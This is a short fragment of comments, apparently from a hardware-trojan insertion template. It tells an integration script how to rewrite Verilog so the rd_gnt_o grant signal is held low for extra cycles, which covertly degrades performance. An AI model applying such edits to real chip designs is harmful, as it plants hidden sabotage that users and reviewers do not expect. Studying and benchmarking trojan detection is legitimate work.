 ...
 * Payload: Delay rd_gnt_o by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay rd_gnt_o by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF rd_gnt_o is a ready/valid signal:
//   Find: assign rd_gnt_o = ready_condition;
//   Replace: assign rd_gnt_o = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF rd_gnt_o is in always_ff:
//   Find: rd_gnt_o <= ready_value;
//   Replace: rd_gnt_o <= (delay_counter == 0) ? ready_value : 1'b0;